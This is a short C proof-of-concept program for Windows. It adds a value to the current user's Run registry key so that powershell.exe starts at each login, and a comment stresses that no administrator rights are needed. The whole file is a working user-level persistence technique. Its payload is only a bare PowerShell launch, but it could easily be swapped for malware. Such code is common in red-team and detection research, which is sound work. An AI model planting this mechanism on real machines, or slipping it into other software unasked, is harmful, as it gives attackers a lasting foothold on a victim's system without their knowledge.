#include <windows.h>
#include <stdio.h>

// This POC executes powershell.exe when the specific user logs in again
// It does not require administrative privileges

int main() {
    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR valueName = "test";
    LPCSTR valueData = "powershell.exe";

    LONG openResult = RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (openResult != ERROR_SUCCESS) {
        printf("Error creating/opening registry key. Error code: %d\n", openResult);
        return 1;
    }

    LONG setResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)valueData, strlen(valueData) + 1);
    if (setResult != ERROR_SUCCESS) {
        printf("Error setting registry value. Error code: %d\n", setResult);
        RegCloseKey(hKey);
        return 1;
    }

    printf("Registry key added successfully.\n");

    RegCloseKey(hKey);
    return 0;
}
